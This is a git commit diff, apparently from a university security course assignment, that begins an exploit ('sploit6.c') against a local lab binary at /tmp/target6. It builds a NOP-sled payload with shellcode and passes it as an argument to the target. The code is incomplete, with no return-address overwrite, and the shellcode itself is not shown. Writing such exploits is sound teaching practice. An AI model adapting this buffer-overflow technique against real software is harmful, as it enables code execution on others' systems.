3f83a14867e222056ed09e085c24da0ba033ee00
Zahan Malkani <zahanm@gmail.com>
2012-04-24 21:34:23 -0700

    basics of a sploit for 6

--- pp1/sploits/sploit6.c
+++ pp1/sploits/sploit6.c
@@ -6,12 +6,17 @@
 
 #define TARGET "/tmp/target6"
 
+static char payload[201];
+
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  memset(payload, 0x90, sizeof(payload));
+  memcpy(payload + sizeof(payload) - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);
+
+  args[0] = TARGET; args[1] = payload; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
